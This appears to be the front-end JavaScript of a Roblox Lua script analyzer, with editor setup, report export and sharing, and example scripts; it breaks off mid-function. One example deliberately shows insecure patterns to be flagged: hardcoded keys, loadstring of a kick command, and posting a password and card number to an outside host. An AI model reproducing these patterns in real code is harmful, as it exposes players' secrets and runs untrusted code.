document.addEventListener('DOMContentLoaded', function() {
    
    const editor = CodeMirror(document.getElementById('codeEditor'), {
        mode: 'lua',
        theme: 'monokai',
        lineNumbers: true,
        indentUnit: 4,
        lineWrapping: true,
        matchBrackets: true,
        autoCloseBrackets: true,
        foldGutter: true,
        gutters: ["CodeMirror-linenumbers", "CodeMirror-foldgutter", "issue-gutter"],
        placeholder: "-- Your Roblox script goes here\n-- Example:\nlocal player = game.Players.LocalPlayer\nprint('Hello, ' .. player.Name .. '!')",
        extraKeys: {
            "Ctrl-Space": "autocomplete",
            "Tab": function(cm) {
                if (cm.somethingSelected()) {
                    cm.indentSelection("add");
                } else {
                    cm.replaceSelection(Array(cm.getOption("indentUnit") + 1).join(" "));
                }
            }
        }
    });
    
    editor.setSize(null, 300);
    
    let issueMarkers = [];
    let issueTooltip = null;
    
    const analyzeBtn = document.getElementById('analyzeBtn');
    const clearBtn = document.getElementById('clearBtn');
    const exampleBtn = document.getElementById('exampleBtn');
    const exportBtn = document.getElementById('exportBtn');
    const shareBtn = document.getElementById('shareBtn');
    const resultsSection = document.getElementById('resultsSection');
    
    
    const fileInput = document.createElement('input');
    fileInput.type = 'file';
    fileInput.accept = '.lua,.luau,.txt';
    fileInput.style.display = 'none';
    document.body.appendChild(fileInput);
    
    const checker = new RobloxScriptChecker();
    
    const exampleScript = `-- Example Roblox script with various issues
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")

-- Deprecated functions (will be flagged)
spawn(function()
    while true do
        wait(1)  -- Should use task.wait()
        print("Loop running")
    end
end)

-- Security issue (will be flagged)
game.ReplicatedStorage.RemoteEvent:FireServer("unsafeData")

-- Performance issue (will be flagged)
for i = 1, 1000 do
    local part = Instance.new("Part")
    part.Parent = workspace
end

-- Better practices
local RunService = game:GetService("RunService")
local connection = RunService.Heartbeat:Connect(function()
    -- Do something
end)

-- Remember to disconnect
connection:Disconnect()`;
    
    
    if (clearBtn) {
        clearBtn.addEventListener('click', function() {
            try {
                clearEditor();
            } catch (error) {
                showNotification('Error during clear: ' + error.message, 'warning');
            }
        });
    }
    
    
    if (exampleBtn) {
        exampleBtn.addEventListener('click', function() {
            try {
                loadExampleScript();
            } catch (error) {
                showNotification('Error during load: ' + error.message, 'warning');
            }
        });
    }
    
    
    document.addEventListener('keydown', function(e) {
        if (e.ctrlKey && e.key === 'o') {
            e.preventDefault();
            loadFromFile();
        }
        if (e.ctrlKey && e.key === 's') {
            e.preventDefault();
            saveCurrentScript();
        }
    });
    
    analyzeBtn.addEventListener('click', function() {
        const script = editor.getValue().trim();
        
        if (!script) {
            showNotification('Please enter a script to analyze', 'warning');
            return;
        }
        
        showLoadingState();
        
        setTimeout(() => {
            const results = checker.analyzeScript(script);
            displayResults(results);
            hideLoadingState();
            showResults();
        }, 1000);
    });
    
    document.addEventListener('click', function(e) {
        if (e.target.classList.contains('collapse-btn')) {
            const targetId = e.target.getAttribute('data-target');
            const targetList = document.getElementById(targetId);
            
            if (targetList) {
                targetList.classList.toggle('collapsed');
                e.target.textContent = targetList.classList.contains('collapsed') ? '+' : '−';
            }
        }
        
        if (e.target.classList.contains('category-header')) {
            const collapseBtn = e.target.querySelector('.collapse-btn');
            if (collapseBtn) {
                collapseBtn.click();
            }
        }
    });
    
    function showLoadingState() {
        const btnIcon = analyzeBtn.querySelector('.btn-icon');
        const btnText = analyzeBtn.querySelector('.btn-text');
        const btnLoading = analyzeBtn.querySelector('.btn-loading');
        
        btnIcon.style.display = 'none';
        btnText.style.display = 'none';
        btnLoading.style.display = 'inline';
        analyzeBtn.disabled = true;
        analyzeBtn.classList.add('loading');
    }
    
    function hideLoadingState() {
        const btnIcon = analyzeBtn.querySelector('.btn-icon');
        const btnText = analyzeBtn.querySelector('.btn-text');
        const btnLoading = analyzeBtn.querySelector('.btn-loading');
        
        btnIcon.style.display = 'inline';
        btnText.style.display = 'inline';
        btnLoading.style.display = 'none';
        analyzeBtn.disabled = false;
        analyzeBtn.classList.remove('loading');
    }
    
    function showResults() {
        resultsSection.style.display = 'block';
        resultsSection.scrollIntoView({ behavior: 'smooth', block: 'start' });
    }
    
    function hideResults() {
        resultsSection.style.display = 'none';
    }
    
    function showNotification(message, type = 'info') {
        const notification = document.createElement('div');
        let backgroundColor = '#667eea'; 
        if (type === 'warning') backgroundColor = '#ed8936';
        else if (type === 'success') backgroundColor = '#38a169';
        
        notification.style.cssText = `
            position: fixed;
            top: 20px;
            right: 20px;
            background: ${backgroundColor};
            color: white;
            padding: 12px 20px;
            border-radius: 8px;
            z-index: 1000;
            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
            animation: slideInRight 0.3s ease;
        `;
        notification.textContent = message;
        document.body.appendChild(notification);
        
        setTimeout(() => {
            notification.style.animation = 'slideOutRight 0.3s ease';
            setTimeout(() => notification.remove(), 300);
        }, 3000);
    }

    let currentResults = null;
    let codeHealthHistory = [];

    
    
    

    function analyzeCodeHealth(results) {
        const health = {
            timestamp: new Date().toISOString(),
            overallScore: calculateOverallScore(results),
            metrics: {
                lineCount: results.lineCount,
                commentCount: results.commentCount,
                nestingLevel: results.nestingLevel,
                commentRatio: results.commentCount / Math.max(results.lineCount, 1)
            },
            issues: {
                security: results.securityIssues?.length || 0,
                deprecations: results.deprecations?.length || 0,
                api: results.apiIssues?.length || 0,
                performance: results.inefficiencies?.length || 0,
                quality: results.lintIssues?.length || 0
            },
            recommendations: generateHealthRecommendations(results)
        };

        
        codeHealthHistory.unshift(health);
        if (codeHealthHistory.length > 10) {
            codeHealthHistory = codeHealthHistory.slice(0, 10);
        }

        return health;
    }

    function generateHealthRecommendations(results) {
        const recommendations = [];
        
        
        if ((results.securityIssues?.length || 0) > 0) {
            recommendations.push({
                priority: 'high',
                category: 'Security',
                message: 'Address security vulnerabilities immediately',
                actions: ['Validate remote calls', 'Remove loadstring usage', 'Sanitize HTTP responses']
            });
        }

        
        if ((results.deprecations?.length || 0) > 0) {
            recommendations.push({
                priority: 'high',
                category: 'Deprecations',
                message: 'Update deprecated APIs to modern alternatives',
                actions: ['Replace wait() with task.wait()', 'Use Animator:LoadAnimation()', 'Update to new constraint system']
            });
        }

        
        if (results.commentCount / Math.max(results.lineCount, 1) < 0.1) {
            recommendations.push({
                priority: 'medium',
                category: 'Documentation',
                message: 'Add more comments to improve code maintainability',
                actions: ['Document complex functions', 'Add module descriptions', 'Explain business logic']
            });
        }

        
        if ((results.inefficiencies?.length || 0) > 0) {
            recommendations.push({
                priority: 'medium',
                category: 'Performance',
                message: 'Optimize code for better performance',
                actions: ['Cache service references', 'Use proper yielding', 'Optimize loops']
            });
        }

        
        if (results.nestingLevel > 4) {
            recommendations.push({
                priority: 'medium',
                category: 'Complexity',
                message: 'Reduce code complexity by refactoring nested structures',
                actions: ['Extract functions', 'Use early returns', 'Simplify conditional logic']
            });
        }

        return recommendations;
    }

    function getHealthTrend() {
        if (codeHealthHistory.length < 2) return 'stable';
        
        const current = codeHealthHistory[0].overallScore;
        const previous = codeHealthHistory[1].overallScore;
        
        if (current > previous + 5) return 'improving';
        if (current < previous - 5) return 'declining';
        return 'stable';
    }

    
    if (exportBtn) {
        exportBtn.addEventListener('click', function() {
            try {
                if (!currentResults) {
                    showNotification('No analysis results to export', 'warning');
                    return;
                }
                exportAdvancedReport(currentResults);
            } catch (error) {
                showNotification('Error during export: ' + error.message, 'warning');
            }
        });
    }

    if (shareBtn) {
        shareBtn.addEventListener('click', function() {
            try {
                if (!currentResults) {
                    showNotification('No analysis results to share', 'warning');
                    return;
                }
                enhancedShareResults(currentResults);
            } catch (error) {
                showNotification('Error during share: ' + error.message, 'warning');
            }
        });
    }

    function exportReport(results) {
        const report = generateReport(results);
        const blob = new Blob([report], { type: 'text/plain' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `roblox-script-analysis-${new Date().toISOString().split('T')[0]}.txt`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
        showNotification('Report exported successfully!', 'success');
    }

    function shareResults(results) {
        const report = generateReport(results);
        if (navigator.share) {
            navigator.share({
                title: 'Roblox Script Analysis Report',
                text: report.substring(0, 200) + '...',
                files: [new File([report], 'analysis-report.txt', { type: 'text/plain' })]
            }).then(() => {
                showNotification('Report shared successfully!', 'success');
            }).catch(() => {
                fallbackShare(report);
            });
        } else {
            fallbackShare(report);
        }
    }

    function fallbackShare(report) {
        if (navigator.clipboard) {
            navigator.clipboard.writeText(report).then(() => {
                showNotification('Report copied to clipboard!', 'success');
            }).catch(() => {
                showNotification('Unable to copy to clipboard', 'warning');
            });
        } else {
            showNotification('Sharing not supported on this device', 'warning');
        }
    }

    function generateReport(results) {
        const date = new Date().toLocaleDateString();
        const score = calculateOverallScore(results);
        
        let report = `ROBLOX SCRIPT ANALYSIS REPORT\n`;
        report += `Generated on: ${date}\n`;
        report += `═══════════════════════════════════\n\n`;
        
        report += `OVERALL SCORE: ${score}/100\n`;
        report += `Lines of Code: ${results.lineCount}\n`;
        report += `Comments: ${results.commentCount}\n`;
        report += `Max Nesting Level: ${results.nestingLevel}\n\n`;
        
        const totalIssues = (results.deprecations?.length || 0) +
                           (results.securityIssues?.length || 0) +
                           (results.apiIssues?.length || 0) +
                           (results.inefficiencies?.length || 0) +
                           (results.lintIssues?.length || 0);
        
        report += `TOTAL ISSUES: ${totalIssues}\n\n`;
        
        
        if (results.securityIssues?.length > 0) {
            report += `🔒 SECURITY ISSUES (${results.securityIssues.length})\n`;
            report += `${'-'.repeat(40)}\n`;
            results.securityIssues.forEach((issue, i) => {
                report += `${i + 1}. Line ${issue.line}: ${issue.message}\n`;
                if (issue.suggestion) report += `   Suggestion: ${issue.suggestion}\n`;
                report += `\n`;
            });
        }
        
        
        if (results.deprecations?.length > 0) {
            report += `⚠️  DEPRECATIONS (${results.deprecations.length})\n`;
            report += `${'-'.repeat(40)}\n`;
            results.deprecations.forEach((issue, i) => {
                report += `${i + 1}. Line ${issue.line}: ${issue.message}\n`;
                if (issue.suggestion) report += `   Suggestion: ${issue.suggestion}\n`;
                if (issue.docUrl) report += `   Documentation: ${issue.docUrl}\n`;
                report += `\n`;
            });
        }
        
        
        if (results.apiIssues?.length > 0) {
            report += `🔧 API ISSUES (${results.apiIssues.length})\n`;
            report += `${'-'.repeat(40)}\n`;
            results.apiIssues.forEach((issue, i) => {
                report += `${i + 1}. Line ${issue.line}: ${issue.message}\n`;
                report += `\n`;
            });
        }
        
        
        if (results.inefficiencies?.length > 0) {
            report += `⚡ PERFORMANCE ISSUES (${results.inefficiencies.length})\n`;
            report += `${'-'.repeat(40)}\n`;
            results.inefficiencies.forEach((issue, i) => {
                report += `${i + 1}. Line ${issue.line}: ${issue.message}\n`;
                report += `\n`;
            });
        }
        
        
        if (results.lintIssues?.length > 0) {
            report += `✨ CODE QUALITY ISSUES (${results.lintIssues.length})\n`;
            report += `${'-'.repeat(40)}\n`;
            results.lintIssues.forEach((issue, i) => {
                report += `${i + 1}. Line ${issue.line}: ${issue.message}\n`;
                report += `\n`;
            });
        }
        
        report += `\n═══════════════════════════════════\n`;
        report += `Generated by Roblox Script Analyzer\n`;
        
        return report;
    }

    
    
    

    function exportAdvancedReport(results) {
        const formats = ['txt', 'json', 'csv', 'html'];
        
        
        const modal = createExportModal(formats);
        document.body.appendChild(modal);
        
        modal.addEventListener('click', function(e) {
            if (e.target.classList.contains('export-format-btn')) {
                const format = e.target.dataset.format;
                downloadReport(results, format);
                document.body.removeChild(modal);
            }
            if (e.target.classList.contains('modal-close') || e.target.classList.contains('export-modal')) {
                document.body.removeChild(modal);
            }
        });
    }

    function createExportModal(formats) {
        const modal = document.createElement('div');
        modal.className = 'export-modal';
        modal.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.5);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 10000;
        `;

        modal.innerHTML = `
            <div class="export-dialog" style="
                background: white;
                padding: 30px;
                border-radius: 12px;
                max-width: 400px;
                width: 90%;
                box-shadow: 0 20px 40px rgba(0,0,0,0.3);
            ">
                <h3 style="margin-top: 0; color: #2d3748;">Export Analysis Report</h3>
                <p style="color: #718096; margin-bottom: 20px;">Choose your preferred export format:</p>
                
                <div class="export-formats" style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
                    ${formats.map(format => `
                        <button class="export-format-btn" data-format="${format}" style="
                            padding: 12px 20px;
                            border: 2px solid #e2e8f0;
                            background: white;
                            border-radius: 8px;
                            cursor: pointer;
                            transition: all 0.2s;
                            text-transform: uppercase;
                            font-weight: bold;
                            color: #4a5568;
                        ">${format}</button>
                    `).join('')}
                </div>
                
                <button class="modal-close" style="
                    margin-top: 20px;
                    padding: 10px 20px;
                    background: #e53e3e;
                    color: white;
                    border: none;
                    border-radius: 6px;
                    cursor: pointer;
                    float: right;
                ">Cancel</button>
            </div>
        `;

        return modal;
    }

    function downloadReport(results, format) {
        let content, filename, mimeType;
        const date = new Date().toISOString().split('T')[0];
        
        switch (format) {
            case 'json':
                content = JSON.stringify({
                    analysis: results,
                    health: analyzeCodeHealth(results),
                    exportedAt: new Date().toISOString()
                }, null, 2);
                filename = `roblox-analysis-${date}.json`;
                mimeType = 'application/json';
                break;
                
            case 'csv':
                content = generateCSVReport(results);
                filename = `roblox-analysis-${date}.csv`;
                mimeType = 'text/csv';
                break;
                
            case 'html':
                content = generateHTMLReport(results);
                filename = `roblox-analysis-${date}.html`;
                mimeType = 'text/html';
                break;
                
            default: 
                content = generateReport(results);
                filename = `roblox-analysis-${date}.txt`;
                mimeType = 'text/plain';
        }

        const blob = new Blob([content], { type: mimeType });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = filename;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
        
        showNotification(`${format.toUpperCase()} report exported successfully!`, 'success');
    }

    function generateCSVReport(results) {
        let csv = 'Category,Line,Severity,Message,Suggestion\n';
        
        const addIssues = (issues, category) => {
            issues?.forEach(issue => {
                csv += `"${category}","${issue.line}","${issue.severity || 'N/A'}","${issue.message}","${issue.suggestion || 'N/A'}"\n`;
            });
        };

        addIssues(results.securityIssues, 'Security');
        addIssues(results.deprecations, 'Deprecation');
        addIssues(results.apiIssues, 'API');
        addIssues(results.inefficiencies, 'Performance');
        addIssues(results.lintIssues, 'Quality');

        return csv;
    }

    function generateHTMLReport(results) {
        const health = analyzeCodeHealth(results);
        const score = health.overallScore;
        
        return `<!DOCTYPE html>
<html>
<head>
    <title>Roblox Script Analysis Report</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; max-width: 1200px; margin: 0 auto; padding: 20px; }
        .header { text-align: center; margin-bottom: 30px; }
        .score { font-size: 48px; font-weight: bold; color: ${score >= 80 ? '#38a169' : score >= 60 ? '#ed8936' : '#e53e3e'}; }
        .metrics { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin: 20px 0; }
        .metric-card { background: #f7fafc; padding: 20px; border-radius: 8px; text-align: center; }
        .issues { margin-top: 30px; }
        .issue-category { margin-bottom: 25px; }
        .issue-category h3 { color: #2d3748; border-bottom: 2px solid #e2e8f0; padding-bottom: 5px; }
        .issue-item { background: white; padding: 15px; margin: 10px 0; border-left: 4px solid #ed8936; border-radius: 4px; }
        .recommendations { background: #ebf8ff; padding: 20px; border-radius: 8px; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="header">
        <h1>Roblox Script Analysis Report</h1>
        <div class="score">${score}/100</div>
        <p>Generated on ${new Date().toLocaleDateString()}</p>
    </div>
    
    <div class="metrics">
        <div class="metric-card"><h3>Lines of Code</h3><p>${results.lineCount}</p></div>
        <div class="metric-card"><h3>Comments</h3><p>${results.commentCount}</p></div>
        <div class="metric-card"><h3>Nesting Level</h3><p>${results.nestingLevel}</p></div>
        <div class="metric-card"><h3>Total Issues</h3><p>${(results.securityIssues?.length || 0) + (results.deprecations?.length || 0) + (results.apiIssues?.length || 0) + (results.inefficiencies?.length || 0) + (results.lintIssues?.length || 0)}</p></div>
    </div>
    
    <div class="issues">
        ${generateHTMLIssueSection('Security Issues', results.securityIssues)}
        ${generateHTMLIssueSection('Deprecations', results.deprecations)}
        ${generateHTMLIssueSection('API Issues', results.apiIssues)}
        ${generateHTMLIssueSection('Performance Issues', results.inefficiencies)}
        ${generateHTMLIssueSection('Code Quality Issues', results.lintIssues)}
    </div>
    
    <div class="recommendations">
        <h3>Recommendations</h3>
        ${health.recommendations.map(rec => `
            <div style="margin: 10px 0;">
                <strong>${rec.category}:</strong> ${rec.message}
                <ul>${rec.actions.map(action => `<li>${action}</li>`).join('')}</ul>
            </div>
        `).join('')}
    </div>
</body>
</html>`;
    }

    function generateHTMLIssueSection(title, issues) {
        if (!issues || issues.length === 0) return `<div class="issue-category"><h3>${title} (0)</h3><p>No issues found ✅</p></div>`;
        
        return `
            <div class="issue-category">
                <h3>${title} (${issues.length})</h3>
                ${issues.map(issue => `
                    <div class="issue-item">
                        <strong>Line ${issue.line}:</strong> ${issue.message}
                        ${issue.suggestion ? `<br><em>Suggestion: ${issue.suggestion}</em>` : ''}
                    </div>
                `).join('')}
            </div>
        `;
    }

    function enhancedShareResults(results) {
        const health = analyzeCodeHealth(results);
        const shareOptions = [
            { name: 'Quick Summary', type: 'summary' },
            { name: 'Full Report', type: 'full' },
            { name: 'Issues Only', type: 'issues' },
            { name: 'Health Score', type: 'health' }
        ];

        const modal = createShareModal(shareOptions);
        document.body.appendChild(modal);
        
        modal.addEventListener('click', function(e) {
            if (e.target.classList.contains('share-option-btn')) {
                const type = e.target.dataset.type;
                performShare(results, health, type);
                document.body.removeChild(modal);
            }
            if (e.target.classList.contains('modal-close') || e.target.classList.contains('share-modal')) {
                document.body.removeChild(modal);
            }
        });
    }

    function createShareModal(options) {
        const modal = document.createElement('div');
        modal.className = 'share-modal';
        modal.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.5);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 10000;
        `;

        modal.innerHTML = `
            <div class="share-dialog" style="
                background: white;
                padding: 30px;
                border-radius: 12px;
                max-width: 400px;
                width: 90%;
                box-shadow: 0 20px 40px rgba(0,0,0,0.3);
            ">
                <h3 style="margin-top: 0; color: #2d3748;">Share Analysis Results</h3>
                <p style="color: #718096; margin-bottom: 20px;">Choose what to share:</p>
                
                <div class="share-options" style="display: grid; gap: 10px;">
                    ${options.map(option => `
                        <button class="share-option-btn" data-type="${option.type}" style="
                            padding: 12px 20px;
                            border: 2px solid #e2e8f0;
                            background: white;
                            border-radius: 8px;
                            cursor: pointer;
                            transition: all 0.2s;
                            font-weight: bold;
                            color: #4a5568;
                            text-align: left;
                        ">${option.name}</button>
                    `).join('')}
                </div>
                
                <button class="modal-close" style="
                    margin-top: 20px;
                    padding: 10px 20px;
                    background: #e53e3e;
                    color: white;
                    border: none;
                    border-radius: 6px;
                    cursor: pointer;
                    float: right;
                ">Cancel</button>
            </div>
        `;

        return modal;
    }

    function performShare(results, health, type) {
        let content;
        
        switch (type) {
            case 'summary':
                content = `🔍 Roblox Script Analysis Summary\n\nScore: ${health.overallScore}/100\nLines: ${results.lineCount} | Comments: ${results.commentCount}\nIssues: ${health.issues.security + health.issues.deprecations + health.issues.api + health.issues.performance + health.issues.quality}\n\n✨ Analyzed with Roblox Script Analyzer`;
                break;
            case 'health':
                const trend = getHealthTrend();
                content = `💊 Code Health Report\n\nOverall Score: ${health.overallScore}/100\nTrend: ${trend === 'improving' ? '📈' : trend === 'declining' ? '📉' : '➡️'} ${trend.charAt(0).toUpperCase() + trend.slice(1)}\n\nTop Priority: ${health.recommendations[0]?.category || 'None'}\n\n⚡ Generated by Roblox Script Analyzer`;
                break;
            case 'issues':
                content = `⚠️ Script Issues Report\n\n🔒 Security: ${health.issues.security}\n⚠️ Deprecations: ${health.issues.deprecations}\n🔧 API Issues: ${health.issues.api}\n⚡ Performance: ${health.issues.performance}\n✨ Quality: ${health.issues.quality}\n\n🛠️ Get detailed analysis at Roblox Script Analyzer`;
                break;
            default: 
                content = generateReport(results);
        }

        if (navigator.share) {
            navigator.share({
                title: 'Roblox Script Analysis',
                text: content
            }).then(() => {
                showNotification('Results shared successfully!', 'success');
            }).catch(() => {
                fallbackShare(content);
            });
        } else {
            fallbackShare(content);
        }
    }

    
    
    

    function clearEditor() {
        if (editor.getValue().trim() && !confirm('Are you sure you want to clear the editor? Any unsaved work will be lost.')) {
            return;
        }
        
        editor.setValue('');
        hideResults();
        currentResults = null;
        clearEditorHighlights();
        
        
        document.getElementById('overallScore').textContent = '--';
        document.getElementById('scoreDescription').textContent = 'Run analysis to see code health score';
        document.getElementById('scoreCircle').style.background = '';
        
        ['lineCount', 'commentCount', 'nestingLevel', 'totalIssues'].forEach(id => {
            document.getElementById(id).textContent = '0';
        });
        
        showNotification('Editor cleared successfully', 'success');
    }

    function loadExampleScript() {
        const examples = [
            {
                name: 'Legacy Script (Many Issues)',
                description: 'Common deprecated APIs and poor practices',
                code: `local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")

spawn(function()
    while true do
        wait(1)
        print("Loop running every second")
    end
end)

delay(5, function()
    print("Delayed execution")
end)

local animation = Instance.new("Animation")
animation.AnimationId = "rbxassetid://123456789"
local animTrack = humanoid:LoadAnimation(animation)

local bodyVelocity = Instance.new("BodyVelocity")
bodyVelocity.MaxForce = Vector3.new(4000, 4000, 4000)
bodyVelocity.Velocity = Vector3.new(0, 50, 0)
bodyVelocity.Parent = character.HumanoidRootPart

game.ReplicatedStorage.RemoteEvent:FireServer("unvalidated_data")

local ray = Ray.new(character.HumanoidRootPart.Position, Vector3.new(0, -10, 0))
local hit, position = workspace:FindPartOnRay(ray)`
            },
            {
                name: 'Security Vulnerabilities',
                description: 'Examples of common security issues',
                code: `local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local player = Players.LocalPlayer
local remoteEvent = ReplicatedStorage:WaitForChild("ProcessData")

local API_KEY = "sk_live_abcd1234567890efgh1234567890ijkl"
local SECRET_TOKEN = "bearer_xyz789abc123def456ghi789"

remoteEvent:FireServer({
    userId = player.UserId,
    coins = 999999,
    level = 100,
    items = {"Sword", "Shield", "Potion"}
})

local maliciousCode = 'game.Players:GetPlayers()[1]:Kick("Hacked!")'
loadstring(maliciousCode)()

local response = HttpService:GetAsync("http://suspicious-site.com/api/user-data")
local userData = HttpService:JSONDecode(response)

player.Character.Humanoid.Health = 0

local dataToSend = {
    password = "mySecretPassword123",
    creditCard = "4532-1234-5678-9012"
}
HttpService:PostAsync("https://external-api.com/submit", HttpService:JSONEncode(dataToSend))`
            },
            {
                name: 'Performance Problems',
                description: 'Inefficient code patterns that hurt performance',
                code: `local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")

local player = Players.LocalPlayer

while true do
    wait(0.03)
    
    for i = 1, 500 do
        local part = Instance.new("Part")
        part.Name = "Part" .. i
        part.Size = Vector3.new(1, 1, 1)
        part.Position = Vector3.new(math.random(-50, 50), 10, math.random(-50, 50))
        part.Parent = workspace
        
        for _, otherPart in pairs(workspace:GetChildren()) do
            if otherPart:IsA("Part") and otherPart ~= part then
                local distance = (part.Position - otherPart.Position).Magnitude
                if distance < 5 then
                    part.BrickColor = BrickColor.Red()
                end
            end
        end
    end
    
    local allParts = {}
    for _, obj in pairs(workspace:GetChildren()) do
        if obj:IsA("Part") then
            table.insert(allParts, obj.Name .. " at " .. tostring(obj.Position))
        end
    end
    local partList = table.concat(allParts, ", ")
    print("Parts: " .. partList)
end

spawn(function()
    while true do
        local runService = game:GetService("RunService")
        local players = game:GetService("Players")
        local lighting = game:GetService("Lighting")
        wait(0.1)
    end
end)`
            },
            {
                name: 'Modern Best Practices',
                description: 'Clean, efficient code following current standards',
                code: `local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local player = Players.LocalPlayer
local remoteEvent = ReplicatedStorage:WaitForChild("ValidatedRemote")

local character = player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")
local animator = humanoid:WaitForChild("Animator")
local rootPart = character:WaitForChild("HumanoidRootPart")

local animation = Instance.new("Animation")
animation.AnimationId = "rbxassetid://123456789"
local animationTrack = animator:LoadAnimation(animation)

local attachment = Instance.new("Attachment")
attachment.Name = "MovementAttachment"
attachment.Parent = rootPart

local linearVelocity = Instance.new("LinearVelocity")
linearVelocity.Attachment0 = attachment
linearVelocity.MaxForce = 4000
linearVelocity.VectorVelocity = Vector3.new(0, 0, 0)
linearVelocity.Parent = rootPart

local function validateAndSendData(data)
    if type(data) == "table" and data.action and type(data.action) == "string" then
        remoteEvent:FireServer(data)
    end
end

local raycastParams = RaycastParams.new()
raycastParams.FilterType = Enum.RaycastFilterType.Blacklist
raycastParams.FilterDescendantsInstances = {character}

local function performRaycast()
    local origin = rootPart.Position
    local direction = Vector3.new(0, -10, 0)
    
    local result = workspace:Raycast(origin, direction, raycastParams)
    if result then
        return result.Instance, result.Position
    end
    return nil, nil
end

local connections = {}

connections.heartbeat = RunService.Heartbeat:Connect(function()
    local hit, position = performRaycast()
    if hit then
        linearVelocity.VectorVelocity = Vector3.new(0, 0, 0)
    end
end)

connections.playerRemoving = Players.PlayerRemoving:Connect(function(leavingPlayer)
    if leavingPlayer == player then
        animationTrack:Stop()
        linearVelocity:Destroy()
        
        for _, connection in pairs(connections) do
            if connection then
                connection:Disconnect()
            end
        end
    end
end)

task.spawn(function()
    while character and character.Parent do
        task.wait(1)
        validateAndSendData({
            action = "heartbeat",
            timestamp = tick()
        })
    end
end)`
            },
            {
                name: 'GUI System Example',
                description: 'Professional GUI creation with proper practices',
                code: `local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "MainInterface"
screenGui.ResetOnSpawn = false
screenGui.Parent = playerGui

local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.new(0, 400, 0, 300)
mainFrame.Position = UDim2.new(0.5, -200, 0.5, -150)
mainFrame.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
mainFrame.BorderSizePixel = 0
mainFrame.Parent = screenGui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 8)
corner.Parent = mainFrame

local titleLabel = Instance.new("TextLabel")
titleLabel.Name = "Title"
titleLabel.Size = UDim2.new(1, 0, 0, 50)
titleLabel.Position = UDim2.new(0, 0, 0, 0)
titleLabel.BackgroundTransparency = 1
titleLabel.Text = "Game Interface"
titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
titleLabel.TextScaled = true
titleLabel.Font = Enum.Font.SourceSansBold
titleLabel.Parent = mainFrame

local closeButton = Instance.new("TextButton")
closeButton.Name = "CloseButton"
closeButton.Size = UDim2.new(0, 30, 0, 30)
closeButton.Position = UDim2.new(1, -35, 0, 10)
closeButton.BackgroundColor3 = Color3.fromRGB(220, 53, 69)
closeButton.Text = "×"
closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
closeButton.TextScaled = true
closeButton.Font = Enum.Font.SourceSansBold
closeButton.Parent = mainFrame

local closeCorner = Instance.new("UICorner")
closeCorner.CornerRadius = UDim.new(0, 4)
closeCorner.Parent = closeButton

local function animateButton(button, hoverScale)
    hoverScale = hoverScale or 1.1
    
    button.MouseEnter:Connect(function()
        local tween = TweenService:Create(button, 
            TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
            {Size = button.Size * hoverScale}
        )
        tween:Play()
    end)
    
    button.MouseLeave:Connect(function()
        local tween = TweenService:Create(button,
            TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
            {Size = button.Size / hoverScale}
        )
        tween:Play()
    end)
end

local function slideIn()
    mainFrame.Position = UDim2.new(0.5, -200, -1, 0)
    mainFrame.Visible = true
    
    local tween = TweenService:Create(mainFrame,
        TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
        {Position = UDim2.new(0.5, -200, 0.5, -150)}
    )
    tween:Play()
end

local function slideOut()
    local tween = TweenService:Create(mainFrame,
        TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.In),
        {Position = UDim2.new(0.5, -200, 1.5, 0)}
    )
    tween:Play()
    
    tween.Completed:Connect(function()
        screenGui:Destroy()
    end)
end

animateButton(closeButton, 1.2)

closeButton.Activated:Connect(slideOut)

UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if not gameProcessed and input.KeyCode == Enum.KeyCode.E then
        if screenGui.Parent then
            slideOut()
        end
    end
end)

slideIn()`
            },
            {
                name: 'DataStore Best Practices',
                description: 'Safe and efficient data persistence',
                code: `local Players = game:GetService("Players")
local DataStoreService = game:GetService("DataStoreService")
local RunService = game:GetService("RunService")

local playerDataStore = DataStoreService:GetDataStore("PlayerData_v2")
local defaultPlayerData = {
    coins = 100,
    level = 1,
    experience = 0,
    inventory = {"Starter Sword"},
    settings = {
        musicVolume = 0.5,
        soundVolume = 0.8,
        graphics = "Medium"
    },
    lastLogin = 0
}

local playerDataCache = {}
local pendingSaves = {}

local function deepCopy(original)
